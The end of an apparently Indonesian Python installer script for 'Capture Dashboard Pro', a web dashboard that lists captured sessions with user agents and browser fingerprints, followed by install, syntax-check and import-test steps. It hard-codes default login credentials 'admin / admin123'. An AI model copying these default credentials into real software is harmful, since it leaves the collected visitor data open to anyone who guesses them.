        '<tr><td>User Agent</td><td><code style="font-size:11px">' + escapeHtml((d.user_agent || '').substring(0, 200)) + '</code></td></tr>' +
        '</table>' +
        '<h4 style="margin-top:16px;color:#888;font-size:12px">FINGERPRINT</h4>' +
        '<table>' + fpRows + '</table>' +
        '</div>';

      Swal.fire({
        title: 'Detail Sesi',
        html: html,
        width: 700,
        confirmButtonText: 'Tutup',
        confirmButtonColor: '#1e6feb',
      });
    } catch (err) { Swal.fire('Error', err.message, 'error'); }
  });
});

const searchBox = document.getElementById('searchBox');
let searchTimer;
function applyFilter() {
  const q = (searchBox.value || '').toLowerCase().trim();
  let visible = 0;
  document.querySelectorAll('.card').forEach(card => {
    const hay = (card.dataset.search || '').toLowerCase();
    const match = !q || hay.includes(q);
    card.style.display = match ? '' : 'none';
    if (match) visible++;
  });
  const v = document.getElementById('statVisible');
  if (v) v.textContent = visible;
}
if (searchBox) {
  searchBox.addEventListener('input', () => {
    clearTimeout(searchTimer);
    searchTimer = setTimeout(applyFilter, 200);
  });
}

const btnRefresh = document.getElementById('btnRefresh');
if (btnRefresh) btnRefresh.addEventListener('click', () => location.reload());

function updateCounts(delta) {
  const t = document.getElementById('totalBadge');
  const s1 = document.getElementById('statTotal');
  const s2 = document.getElementById('statVisible');
  if (t) t.textContent = ((parseInt(t.textContent) || 0) + delta) + ' sesi';
  if (s1) s1.textContent = (parseInt(s1.textContent) || 0) + delta;
  if (s2) s2.textContent = (parseInt(s2.textContent) || 0) + delta;
}

function escapeHtml(s) {
  if (s == null) return '';
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}
"""


def write_files():
    print("\n[3/6] Tulis file project...")
    for rel, content in FILES.items():
        p = PROJECT / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    print("      OK - " + str(len(FILES)) + " file")


def test_syntax():
    print("\n[4/6] Test syntax Python...")
    errors = []
    for py in PROJECT.rglob("*.py"):
        try:
            compile(py.read_text(encoding="utf-8"), str(py), "exec")
        except SyntaxError as e:
            errors.append(str(py) + ": " + str(e))
    if errors:
        print("      GAGAL:")
        for e in errors:
            print("      -", e)
        sys.exit(1)
    print("      OK")


def test_import():
    print("\n[5/6] Test import app...")
    os.chdir(str(PROJECT))
    sys.path.insert(0, str(PROJECT))
    try:
        import importlib
        import app as app_module
        importlib.reload(app_module)
        app = app_module.create_app()
        print("      OK - App berhasil dibuat")
    except Exception as e:
        print("      GAGAL:", e)
        import traceback
        traceback.print_exc()
        sys.exit(1)


def finish():
    print("\n[6/6] Selesai!")
    print()
    print("=" * 60)
    print("  INSTALL BERHASIL")
    print("=" * 60)
    print()
    print("  Cara jalanin:")
    print()
    print("    cd ~/capture-pro")
    print("    python run.py")
    print()
    print("  Buka browser:")
    print("    http://localhost:8000/")
    print("    http://localhost:8000/dashboard")
    print()
    print("  Login: admin / admin123 (bisa diganti di .env)")
    print()


if __name__ == "__main__":
    print("=" * 60)
    print("  Capture Dashboard Pro - Installer v2")
    print("=" * 60)

    if PROJECT.exists():
        print("\nFolder", PROJECT, "sudah ada.")
        ans = input("Hapus & install ulang? (y/n): ").strip().lower()
        if ans == "y":
            shutil.rmtree(PROJECT)
        else:
            print("Batal.")
            sys.exit(0)

    pip_install()
    make_dirs()
    write_files()
    test_syntax()
    test_import()
    finish()
